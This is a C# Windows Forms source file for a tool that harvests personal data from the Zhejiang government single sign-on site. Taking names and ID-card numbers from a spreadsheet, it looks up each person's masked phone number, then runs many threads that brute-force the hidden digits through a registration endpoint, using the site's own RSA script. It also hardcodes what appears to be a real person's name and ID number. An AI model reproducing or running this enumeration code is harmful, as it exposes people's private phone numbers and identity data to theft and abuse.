using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using myDLL;

namespace 浙江企业基础信息查询
{
    public partial class 查询5 : Form
    {
        public 查询5()
        {
            InitializeComponent();
        }

        string cookie = "";
        #region POST请求

        public string PostUrl(string url, string postData)
        {
            try
            {
                System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12; //获取不到加上这一条
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "Post";
                request.ContentType = "application/x-www-form-urlencoded";
                request.ContentLength = postData.Length;
                //request.ContentLength = Encoding.UTF8.GetBytes(postData).Length;
                request.AllowAutoRedirect = false;
                request.Headers.Add("Cookie", cookie);
                request.KeepAlive = true;
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36";
                //request.Referer = "http://puser.zjzwfw.gov.cn/sso/newusp.do?action=forgotPwd&servicecode=zjdsjgrbs#";
               // request.Referer = "";
                StreamWriter sw = new StreamWriter(request.GetRequestStream());
                sw.Write(postData);
                sw.Flush();

                HttpWebResponse response = request.GetResponse() as HttpWebResponse;  //获取反馈
                response.GetResponseHeader("Set-Cookie");
                StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding("utf-8")); //reader.ReadToEnd() 表示取得网页的源码流 需要引用 using  IO

                string html = reader.ReadToEnd();
                reader.Close();
                response.Close();
                return html;
            }
            catch (WebException ex)
            {

                //MessageBox.Show(ex.ToString());
                return ex.ToString();
            }


        }

        #endregion
        private void button6_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog1 = new OpenFileDialog();
            openFileDialog1.Title = "打开excel文件";
            //openFileDialog1.Filter = "excel03文件(*.xls)|*.xls|excel07文件(*.xlsx)|*.xlsx";
            openFileDialog1.Filter = "excel07文件(*.xlsx)|*.xlsx";
            openFileDialog1.InitialDirectory = @"C:\Users\Administrator\Desktop";
            openFileDialog1.RestoreDirectory = true;
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {

                //打开文件对话框选择的文件
                textBox1.Text = openFileDialog1.FileName;


            }
        }

        private delegate string Encrypt(string pwd);//代理

        public string getencrypt(string pwd)
        {

            string result = webBrowser1.Document.InvokeScript("RSA", new object[] { pwd }).ToString();
            return result;
        }


        Thread thread;

        string[] urls = new[] {
            "0",
       "500",
       "1000",
       "1500",
       "2000",
       "2500",
       "3000"
    
};


       
        public async void ceshi()
        {
            Control.CheckForIllegalCrossThreadCalls = false;
            var maxThreads = 10;
            var q = new ConcurrentQueue<string>(urls);
            var tasks = new List<Task>();
            for (int n = 0; n < maxThreads; n++)
            {
                tasks.Add(Task.Run(async () => {
                    while (q.TryDequeue(out string a))
                    {
                        string name = "钟宏业";
                        string card = "330206196601100019";
                        string mobilephone = "170****2028";
                        string loginname = "A****3";
                        for (int i = Convert.ToInt32(a); i < Convert.ToInt32(a)+500; i++)
                        {
                            string phone = mobilephone.Substring(0, 3) + i.ToString("D4") + mobilephone.Substring(7, 4);

                            Encrypt aa = new Encrypt(getencrypt);
                            IAsyncResult iar = BeginInvoke(aa, new object[] { phone });
                            string phonecrypt = EndInvoke(iar).ToString();

                            string url = "https://puser.zjzwfw.gov.cn/sso/newusp.do";
                            string postdata = "action=regByMobile&mobilephone=" + System.Web.HttpUtility.UrlEncode(phonecrypt);
                            string html = PostUrl(url, postdata);
                            string username = Regex.Match(html, @"""username"":""([\s\S]*?)""").Groups[1].Value;
                            string loginname2 = Regex.Match(html, @"""loginname"":""([\s\S]*?)""").Groups[1].Value;
                            string idcard = Regex.Match(html, @"""idcard"":""([\s\S]*?)""").Groups[1].Value;
                            // label1.Text =id+"---->"+ html;
                            if (html.Contains("username"))
                            {
                                if (loginname == loginname2 && name.Substring(name.Length - 1, 1) == username.Substring(username.Length - 1, 1) && card.Substring(card.Length - 1, 1) == idcard.Substring(idcard.Length - 1, 1))
                                {
                                    ListViewItem lv1 = listView1.Items.Add((listView1.Items.Count).ToString());
                                    lv1.SubItems.Add(name);
                                    lv1.SubItems.Add(card);
                                    lv1.SubItems.Add(phone);
                                    

                                }
                                else
                                {

                                    textBox2.Text = phone ;
                                }

                            }
                            else
                            {

                                textBox2.Text = phone ;
                            }
                        }
                    }
                }));
            }
            await Task.WhenAll(tasks);
        }
        private void button1_Click(object sender, EventArgs e)
        {
            dt = method.ExcelToDataTable(textBox1.Text, true);
            label3.Text = "开始执行........";
            //ceshi();
            runmain();
        }

        bool status = true;
        
        DataTable dt;
        public void runmain()
        {
            try
            {
                string timestr = 查询2.GetTimeStamp();
                string gregegedrgerheh = gdsgdgdgdgdstgfeewrwerw3r23r32rvxsvdsv.rgebgdgdvsdfsdvsdfsdvdsbgdsrt435b515sdfsdf("2", timestr);
                string expiretime = gregegedrgerheh.Split(new string[] { "," }, StringSplitOptions.None)[2];

                if (DateTime.Now > Convert.ToDateTime(expiretime))
                {
                    MessageBox.Show("{\"msg\":\"非法请求\"}");
                    return;
                }

                for (int a = 0; a < dt.Rows.Count; a++)
                {
                    
                    
                    string name = dt.Rows[a][0].ToString().Trim();
                    string card = dt.Rows[a][1].ToString().Trim();
                    //textBox2.Text += name +"   "+a+ "\r\n";
                    Encrypt aa1 = new Encrypt(getencrypt);
                    IAsyncResult iar1 = BeginInvoke(aa1, new object[] { card });
                    string phonecrypt1 = EndInvoke(iar1).ToString();

                    string url1 = "https://puser.zjzwfw.gov.cn/sso/newusp.do";
                    string postdata1 = "action=checkidCardUnique&idNum=" + System.Web.HttpUtility.UrlEncode(phonecrypt1);
                    string html1 = PostUrl(url1, postdata1);
                    string loginname = Regex.Match(html1, @"""loginname"":""([\s\S]*?)""").Groups[1].Value;
                    string mobilephone = Regex.Match(html1, @"""mobilephone"":""([\s\S]*?)""").Groups[1].Value;
                    //MessageBox.Show(html1);
                    if (mobilephone.Length < 10||mobilephone.Trim()=="")
                    {
                        ListViewItem lv1 = listView1.Items.Add((listView1.Items.Count).ToString());
                        lv1.SubItems.Add(name);
                        lv1.SubItems.Add(card);
                        lv1.SubItems.Add("无");
                        continue;
                    }
                    for (int i = 0; i < 10000; i = i + 250)
                    {
                        Thread thread = new Thread(new ParameterizedThreadStart(run));
                        object o = name + "#" + card + "#" + mobilephone + "#" + loginname + "#" + i;
                        thread.Start((object)o);
                        Control.CheckForIllegalCrossThreadCalls = false;

                    }
                    while (status == true)
                    {
                        //textBox2.Text = status.ToString()+threadcount.ToString();
                        Application.DoEvents();//如果loader是false表明正在加载,,则Application.DoEvents()意思就是处理其他消息。阻止当前的队列继续执行。
                        if(threadcount==40)
                        {
                            break;
                        }
                    }
                    while(threadcount<40)
                    {
                       // textBox2.Text = status.ToString()+threadcount.ToString();
                        Application.DoEvents();//如果loader是false表明正在加载,,则Application.DoEvents()意思就是处理其他消息。阻止当前的队列继续执行。
                    }
                    status = true;
                    threadcount = 0;
                }
                MessageBox.Show("完成");
                label3.Text = "完成";
            }
            catch (Exception ex)
            {

                MessageBox.Show(ex.ToString());
            }
        }



        public void runmainbeifen()
        {
            try
            {



                for (int a = 0; a < dt.Rows.Count; a++)
                {


                    string name = dt.Rows[a][0].ToString().Trim();
                    string card = dt.Rows[a][1].ToString().Trim();
                    textBox2.Text += name + "   " + a + "\r\n";
                    Encrypt aa1 = new Encrypt(getencrypt);
                    IAsyncResult iar1 = BeginInvoke(aa1, new object[] { card });
                    string phonecrypt1 = EndInvoke(iar1).ToString();

                    string url1 = "https://puser.zjzwfw.gov.cn/sso/newusp.do";
                    string postdata1 = "action=checkidCardUnique&idNum=" + System.Web.HttpUtility.UrlEncode(phonecrypt1);
                    string html1 = PostUrl(url1, postdata1);
                    string loginname = Regex.Match(html1, @"""loginname"":""([\s\S]*?)""").Groups[1].Value;
                    string mobilephone = Regex.Match(html1, @"""mobilephone"":""([\s\S]*?)""").Groups[1].Value;
                    if (mobilephone.Length < 10 || mobilephone.Trim() == "")
                    {
                        ListViewItem lv1 = listView1.Items.Add((listView1.Items.Count).ToString());
                        lv1.SubItems.Add(name);
                        lv1.SubItems.Add(card);
                        lv1.SubItems.Add("无");
                        continue;
                    }
                    for (int i = 0; i < 10000; i = i + 500)
                    {
                        Thread thread = new Thread(new ParameterizedThreadStart(run));
                        object o = name + "#" + card + "#" + mobilephone + "#" + loginname + "#" + i;
                        thread.Start((object)o);
                        Control.CheckForIllegalCrossThreadCalls = false;

                    }
                    while (status == true)
                    {
                        //textBox2.Text = status.ToString()+threadcount.ToString();
                        Application.DoEvents();//如果loader是false表明正在加载,,则Application.DoEvents()意思就是处理其他消息。阻止当前的队列继续执行。
                        if (threadcount == 20)
                        {
                            break;
                        }
                    }
                    while (threadcount < 20)
                    {
                        // textBox2.Text = status.ToString()+threadcount.ToString();
                        Application.DoEvents();//如果loader是false表明正在加载,,则Application.DoEvents()意思就是处理其他消息。阻止当前的队列继续执行。
                    }
                    status = true;
                    threadcount = 0;
                }
                MessageBox.Show("完成");
                label3.Text = "完成";
            }
            catch (Exception ex)
            {

                MessageBox.Show(ex.ToString());
            }
        }
        int threadcount = 0;
        public void run(object o)
        {
            try
            {
                string[] text = o.ToString().Split(new string[] { "#" }, StringSplitOptions.None);
                string name = text[0];
                string card = text[1];
                string mobilephone = text[2];
                string loginname = text[3];
                int max = Convert.ToInt32(text[4]);

               

                for (int i = max; i < max+250; i++)
                {

                  
                    if (status == false)
                    {
                        textBox2.Text += name ;
                        threadcount = threadcount + 1;
                        break;
                    }
                    string phone = mobilephone.Substring(0, 3) + i.ToString("D4") + mobilephone.Substring(7, 4);
                    //label3.Text = phone;
                    Encrypt aa = new Encrypt(getencrypt);
                    IAsyncResult iar = BeginInvoke(aa, new object[] { phone });
                    string phonecrypt = EndInvoke(iar).ToString();

                    string url = "https://puser.zjzwfw.gov.cn/sso/newusp.do";
                    string postdata = "action=regByMobile&mobilephone=" + System.Web.HttpUtility.UrlEncode(phonecrypt);
                    string html = PostUrl(url, postdata);
                   
                   // textBox2.Text= html;
                    //if(html.Trim()=="")
                    //{
                    //    textBox3.Text = DateTime.Now.ToString()+"为空";
                    //    if(i!=max)
                    //    {
                    //        i = i - 1;
                    //    }
                    //    continue;

                    //}
                    string username = Regex.Match(html, @"""username"":""([\s\S]*?)""").Groups[1].Value;
                    string loginname2 = Regex.Match(html, @"""loginname"":""([\s\S]*?)""").Groups[1].Value;
                    string idcard = Regex.Match(html, @"""idcard"":""([\s\S]*?)""").Groups[1].Value;
                    // label1.Text =id+"---->"+ html;
                  
                    if (html.Contains("username"))
                    {
                        // name.Substring(name.Length - 1, 1) == username.Substring(username.Length - 1, 1) &&
                        try
                        {
                            if (loginname == loginname2 && card.Substring(card.Length - 1, 1) == idcard.Substring(idcard.Length - 1, 1) && name.Substring(name.Length - 1, 1) == username.Substring(username.Length - 1, 1))
                            {
                                ListViewItem lv1 = listView1.Items.Add((listView1.Items.Count).ToString());
                                lv1.SubItems.Add(name);
                                lv1.SubItems.Add(card);
                                lv1.SubItems.Add(phone);
                                status = false;
                                threadcount = threadcount + 1;
                            }
                            else
                            {

                            }
                        }
                        catch (Exception)
                        {

                            textBox2.Text = phone;
                            continue;
                        }

                    }
                    else
                    {
                       
                       
                        //textBox2.Text = phone;
                    }

                }
                threadcount = threadcount + 1;
               
            }
            catch (Exception ex)
            {
                textBox2.Text = ex.ToString();
                
                
            }
        }


        FileStream fs1 = new FileStream(AppDomain.CurrentDomain.BaseDirectory + "\\data.txt", FileMode.Append, FileAccess.Write);//创建写入文件 
        StreamWriter sw;


        private void 查询5_Load(object sender, EventArgs e)
        {
            //textBox3.Text = method.GetMD5("0308A30D81BE4658882BB8C8D9C1BC31").ToUpper();
            webBrowser1.Navigate("https://puser.zjzwfw.gov.cn/sso/newusp.do?action=register&servicecode=zjdsjgrbs#"); //按照姓名找回 执行加密RSA JS方法
            sw = new StreamWriter(fs1, Encoding.GetEncoding("UTF-8"));
        }

        private void button4_Click(object sender, EventArgs e)
        {
            method.DataTableToExcel(method.listViewToDataTable(this.listView1), "Sheet1", true);
        }

        private void 查询5_FormClosing(object sender, FormClosingEventArgs e)
        {
            DialogResult dr = MessageBox.Show("确定要关闭吗？", "关闭", MessageBoxButtons.OKCancel, MessageBoxIcon.Question);
            if (dr == DialogResult.OK)
            {
                // Environment.Exit(0);
                System.Diagnostics.Process.GetCurrentProcess().Kill();
            }
            else
            {
                e.Cancel = true;//点取消的代码 
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            listView1.Items.Clear();
        }
    }
}
